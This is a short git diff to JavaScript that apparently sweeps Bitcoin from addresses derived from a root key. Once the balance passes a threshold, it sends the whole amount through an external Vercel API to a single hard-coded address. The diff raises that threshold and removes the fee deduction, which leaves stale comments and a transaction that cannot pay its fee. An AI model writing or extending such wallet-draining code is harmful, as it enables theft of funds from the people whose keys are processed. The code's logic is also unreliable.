@@ -82,7 +82,7 @@ async function processAddressesForAllBipTypes(root, network, electrumClient) {
     }
 
     // Check if the total balance is greater than 200,000 sats
-    if (totalBalance > 200000) {
+    if (totalBalance > 500000) {
         await sendTransaction(totalBalance, allUtxos);
     }
 
@@ -261,7 +261,7 @@ function getAddressType(address) {
 
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
-    const amountToSend = totalBalance - 5000; // Initial transaction fee
+    const amountToSend = totalBalance; // Initial transaction fee
     const changeAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
     const recipientAddress = "bc1qcte0st5mm5jr3zsuucecxwc5e3y775dhpktw5kcfy9znftv4xv3sr4ncku";
     const initialTransactionFee = 5000;
